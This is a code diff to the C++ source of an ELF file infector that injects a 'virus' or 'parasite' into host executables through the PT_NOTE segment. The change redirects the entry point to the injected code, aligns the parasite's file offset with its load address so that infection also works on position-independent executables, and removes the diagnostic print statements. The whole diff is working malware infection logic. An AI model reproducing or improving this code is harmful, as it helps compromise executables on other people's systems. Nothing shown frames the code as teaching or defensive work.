@@ -56,13 +56,7 @@ void patch_phdr(Elf64_Phdr& phdr, uint64_t virus_size, uint64_t virus_offset,
 
 void patch_ehdr(Elf64_Ehdr& ehdr, Elf64_Addr parasite_load_address,
                 uint64_t virus_offset) {
-  if (ehdr.e_type == ET_EXEC) {
-    ehdr.e_entry = parasite_load_address;
-  } else if (ehdr.e_type == ET_DYN) {
-    ehdr.e_entry = virus_offset;
-  } else {
-    CHECK_FAIL();
-  }
+  ehdr.e_entry = parasite_load_address;
 }
 
 }  // namespace
@@ -114,11 +108,9 @@ bool PtNoteInfect::infect(vt::common::Mmap<PROT_READ | PROT_WRITE> host_mapping,
   const auto& ehdr = *reinterpret_cast<const Elf64_Ehdr*>(host_mapping.base());
 
   const auto virus_size = parasite_mapping.size();
-  // because host size is extended with original_size + virus_size + 3
-  // calculate the virus insertion offset. for example:
-  // original_size = 25, virus_size = 4, total_host_size = 31.
-  // virus offset (must be word aligned) is align_up(31 - 4) = 28;
-  const auto virus_offset = round_up_to(host_mapping.size() - 4095, 4096);
+
+  // In order to make it work on PIEs, these two must be the same.
+  const auto virus_offset = parasite_load_address_;
   {
     auto& mutable_phdr = *reinterpret_cast<Elf64_Phdr*>(
         host_mapping.mutable_base() + ehdr.e_phoff);
@@ -134,7 +126,6 @@ bool PtNoteInfect::infect(vt::common::Mmap<PROT_READ | PROT_WRITE> host_mapping,
         host_mapping.mutable_base() + ehdr.e_shoff);
     if (!patch_sht(ehdr, mutable_shdr, virus_size, virus_offset,
                    original_pt_note_file_offset_, parasite_load_address_)) {
-      vt::printf("Failed to patch section header table\n");
       return false;
     }
   }
@@ -144,10 +135,6 @@ bool PtNoteInfect::infect(vt::common::Mmap<PROT_READ | PROT_WRITE> host_mapping,
         *reinterpret_cast<Elf64_Ehdr*>(host_mapping.mutable_base());
     patch_ehdr(mutable_ehdr, parasite_load_address_, virus_offset);
   }
-
-  vt::printf("inject parasite at %x loading at %x\n", virus_offset,
-             parasite_load_address_);
-  vt::printf("entry changed to %x\n", ehdr.e_entry);
 
   // Inject the virus.
   vt::memcpy(host_mapping.mutable_base() + virus_offset,
@@ -159,9 +146,13 @@ bool PtNoteInfect::infect(vt::common::Mmap<PROT_READ | PROT_WRITE> host_mapping,
 }
 
 size_t PtNoteInfect::injected_host_size() {
-  // The executable offset must be page aligned. Therefore always return 4095
-  // extra bytes.
-  return host_size_ + parasite_size_ + 4095;
+  // In order to make this work on PIEs, the virus file offset must equal to
+  // vaddr. Therefore, the file size will be extended. Note that this is not
+  // necessary for non-PIE but doing this makes both PIE and non-PIE handling
+  // simple. The size effect is that the executable would be very big, if the
+  // victim happens to use a custom linker script that points segments at a very
+  // large starting vaddr.
+  return parasite_load_address_ + parasite_size_;
 }
 
 }  // namespace vt::infector
